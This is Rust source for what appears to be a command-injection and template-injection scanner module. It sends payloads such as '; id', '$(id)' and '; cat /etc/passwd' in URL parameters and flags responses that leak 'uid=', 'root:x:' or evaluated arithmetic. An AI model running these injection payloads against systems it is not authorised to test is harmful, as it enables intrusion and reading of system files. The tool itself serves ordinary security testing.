use crate::http::HttpClient;
use crate::types::{Finding, Mode, Severity};
use anyhow::Result;

/// Command Injection / RCE scanner. Crazy mode adds more separators + encodings.
pub async fn scan(http: &HttpClient, target: &str, params: &[String], mode: Mode) -> Result<Vec<Finding>> {
    let mut out = Vec::new();
    let base = if target.contains('?') { target.to_string() } else { format!("{}/?input=test", target.trim_end_matches('/')) };

    let mut payloads = vec![
        "; id",
        "| id",
        "&& id",
        "$(id)",
        "`id`",
        "; cat /etc/passwd",
    ];
    if mode == Mode::Crazy {
        payloads.extend(vec![
            "%0a id",
            "%0d%0a id",
            "|| id",
            ";id;",
            "'; id #",
            "{{123*123}}",           // template injection hint
            "${123*123}",
            "<%= 123*123 %>",
            "; ping -c1 127.0.0.1",
        ]);
    }
    payloads.truncate(mode.payload_intensity().min(payloads.len()));

    for p in params {
        for pl in &payloads {
            let u = inject(&base, p, pl);
            if let Ok((_st, _h, body, _f)) = http.get(&u).await {
                let lb = body.to_lowercase();
                if lb.contains("uid=") && lb.contains("gid=") {
                    out.push(Finding::new(Severity::Critical, "RCE", "Command injection (OS command output leaked)", target)
                        .with_param(p).with_payload(pl)
                        .with_evidence("`id` output (uid=/gid=) reflected")
                        .with_confidence(95));
                } else if lb.contains("root:x:") {
                    out.push(Finding::new(Severity::Critical, "RCE", "Command injection (passwd leaked via cmd)", target)
                        .with_param(p).with_payload(pl).with_confidence(93));
                } else if lb.contains("123123") || lb.contains("15129") {
                    // template/expression injection arithmetic (123*123=15129)
                    out.push(Finding::new(Severity::High, "RCE", "Possible template/expression injection", target)
                        .with_param(p).with_payload(pl)
                        .with_evidence("arithmetic evaluated (123*123)")
                        .with_confidence(80));
                }
            }
        }
    }
    Ok(out)
}

fn inject(base: &str, key: &str, val: &str) -> String {
    if let Ok(mut u) = url::Url::parse(base) {
        u.query_pairs_mut().append_pair(key, val);
        u.to_string()
    } else {
        format!("{}?{}={}", base, key, val)
    }
}
